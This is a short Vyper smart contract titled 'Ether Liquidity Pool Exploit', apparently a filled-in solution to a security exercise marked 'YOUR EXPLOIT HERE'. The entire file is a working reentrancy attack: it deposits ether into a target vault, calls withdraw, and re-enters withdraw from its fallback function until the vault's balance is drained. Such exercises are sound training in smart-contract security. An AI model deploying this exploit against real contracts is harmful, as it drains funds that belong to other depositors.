# @version ^0.3.2

"""
@title Ether Liquidity Pool Exploit
"""

interface Ethervault:
    def deposit(): payable
    def withdraw(): nonpayable
    def __default__(): payable
    def deposits(depositor: address) -> uint256: view

target: address


@external
def __init__(target: address):
    self.target = target

# YOUR EXPLOIT HERE
@external
@payable
def run():
    raw_call(
        self.target,
        _abi_encode("", method_id=method_id("deposit()")),
        value=msg.value
    )

    Ethervault(self.target).withdraw()


@external
@payable
def __default__():
    if self.target.balance > 0:
        Ethervault(self.target).withdraw()
